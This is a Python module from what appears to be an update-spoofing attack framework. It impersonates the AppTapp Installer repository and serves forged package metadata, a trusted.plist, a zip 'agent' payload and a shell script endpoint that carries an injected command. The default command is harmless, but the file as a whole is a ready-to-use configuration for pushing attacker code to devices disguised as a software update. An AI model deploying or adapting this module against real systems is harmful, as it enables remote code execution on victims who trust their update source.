from modules import ModuleBase


class AppTapp(ModuleBase):
    name = 'apptapp'
    version = '1.0'
    appver = '< 3.11'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    agent_filename = './agent/apptapp.zip'
    vh = '(www.apptapp.com|repository.apptapp.com)' 
    requests = [
        {   'path': '/trusted.plist',
            'type': 'file',
            'method': '',
            'bin': '',
            'string' : "",
            'parse': '1',
            'file': './include/apptapp/trusted.plist'
        },
        {   'path': '/feature',
            'type': 'file',
            'method': '',
            'bin': '',
            'string' : "",
            'parse': '',
            'file': './include/apptapp/feature.html'
        },
        {   'path': '/1.png',
            'type': 'file',
            'method': '',
            'bin': '1',
            'string' : "",
            'parse': '',
            'file': './include/apptapp/1.png'
        },
        {   'path': '/new.png',
            'type': 'file',
            'method': '',
            'bin': '1',
            'string' : "",
            'parse': '',
            'file': './include/apptapp/new.png'
        },
        {   'path': '/apptapp.png',
            'type': 'file',
            'method': '',
            'bin': '1',
            'string' : "",
            'parse': '',
            'file': './include/apptapp/apptapp.png'
        },
        {   'path': '/script',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : "#!/bin/zsh\n<%CMD%>",
            'parse': '1',
            'file': ''
        },

        {   'path': '(/repo.xml|/$)',
            'type': 'file',
            'method': '',
            'bin': '',
            'string' : "",
            'parse': '1',
            'file': './include/apptapp/repo.xml'
        },

        {   'path': '.zip',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'ver': {
            'val' : "3.17",
            'desc': 'Application version'
        },
        'bundleIdentifier': {
            'val' : "com.apptapp.Installer",
            'desc': 'Application to install'
        },
        'contact': {
            'val' : "famato\@infobytesec.com",
            'desc': 'Email contact'
        },
        'description': {
            'val' : "The new AppTapp Installer.",
            'desc': 'Application description'
        },
        'maintainer': {
            'val' : "Nullriver Software.",
            'desc': 'Maintainer name'
        },
        'name': {
            'val' : "Installer",
            'desc': 'Installer name'
        },
        'url': {
            'val' : "http://www.nullriver.com/",
            'desc': 'Url'
        },
        'category': {
            'val' : "System",
            'desc': 'Category name'
        },
        'cmd': {
            'val' : "/bin/date > /tmp/info\n",
            'desc': 'Command to inject'
        }
    }